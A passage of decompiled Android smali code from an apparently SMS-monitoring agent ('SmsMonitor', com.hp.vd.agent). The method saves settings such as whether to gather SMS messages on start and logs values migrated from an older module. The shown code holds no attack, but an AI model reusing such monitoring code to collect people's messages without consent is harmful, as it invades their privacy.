    const-string v5, "update(): from the previous module: sms_ATTRIBUTE_MAX_SMS_ID: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    :cond_3
    if-eqz p1, :cond_4

    const-string v1, "sms_gather_sms_on_start"

    .line 197
    invoke-interface {v2, v1, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    if-eqz v0, :cond_4

    const-string v1, "SmsMonitor"

    .line 200
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "update(): from the previous module: sms_ATTRIBUTE_GATHER_SMS_ON_START: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-interface {v0, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 204
    :cond_4
    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move-result p1

    return p1

    :catch_0
    if-eqz v0, :cond_5

    const-string p1, "SmsMonitor"

    const-string v3, "Could not load the persistedModuleData from the old module we are currently upgrading."

    .line 152
    invoke-interface {v0, p1, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    :cond_5
    return v2
.end method
